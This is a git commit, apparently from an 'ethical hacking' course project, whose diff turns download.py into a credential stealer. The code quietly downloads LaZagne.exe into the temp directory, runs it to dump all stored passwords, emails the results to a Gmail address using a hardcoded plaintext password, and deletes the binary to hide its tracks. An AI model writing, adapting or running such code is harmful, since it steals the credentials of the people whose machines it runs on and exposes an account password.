6a0bbea6361c50c4d52765db63cb3c856203b168
Shubh Gupta <sgupta121-comp@bvucoep.edu.in>
2025-08-07 15:13:07 +0530

    mmit This will download lazane in temp folder where user ca nnot see it and then delete it after use

--- download.py
+++ download.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import requests
+import requests, subprocess, smtplib, os, tempfile
 
 def download(url):
     get_response = requests.get(url)
@@ -7,4 +7,18 @@ def download(url):
     with open(file_name, "wb") as out_file:
         out_file.write(get_response.content)
 
-download("https://raw.githubusercontent.com/quietcod/Python-Ethical-Hacking/main/saved_wifi_pass.py")
+def send_email(email, password, message):
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+temp_directory = tempfile.gettempdir() # file will be downloadedi in the temp directory
+os.chdir(temp_directory)
+
+download("http://192.168.11.111/files/LaZagne.exe")
+result =  subprocess.check_output(["LaZagne.exe", "all"], shell=True)
+print(result) # remove after testing
+send_email("batman99q@gmail.com", "qwerty&234", result)
+os.remove("LaZagne.exe")
